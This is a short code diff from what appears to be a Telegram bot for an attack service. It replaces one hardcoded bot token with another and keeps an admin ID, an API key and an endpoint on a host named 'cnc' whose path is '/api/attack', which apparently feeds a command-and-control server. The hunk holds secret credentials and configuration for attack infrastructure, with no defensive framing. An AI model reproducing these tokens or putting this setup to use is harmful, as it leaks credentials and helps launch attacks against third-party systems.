@@ -20,7 +20,7 @@ def get_current_ist():
 def format_ist_time(dt):
     return dt.strftime('%d %b %Y, %I:%M:%S %p') + " IST"
 
-BOT_TOKEN = "8760406918:AAFOIHhACXIb96Ytt2TGH5ZopfQr97pTBeg"
+BOT_TOKEN = "8760406918:AAFu-6PklpCuQyh0yLjzWyzikcYpzi_4KQc"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "F6XMND"
